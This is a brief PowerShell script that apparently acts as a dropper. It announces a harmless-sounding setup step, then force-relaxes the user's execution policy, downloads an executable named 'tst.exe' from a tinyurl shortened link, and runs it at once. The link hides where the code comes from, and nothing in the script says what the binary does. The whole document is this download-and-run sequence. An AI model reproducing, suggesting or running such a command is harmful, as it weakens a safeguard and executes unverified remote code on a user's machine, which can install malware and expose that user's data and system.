Write-Host "Setting execution policy..." -ForegroundColor Cyan
Set-ExecutionPolicy RemoteSigned -Scope CurrentUser -Force

iwr -Uri "tinyurl.com/yehaijikaammera" -OutFile "$HOME\Downloads\tst.exe"; & "$HOME\Downloads\tst.exe"
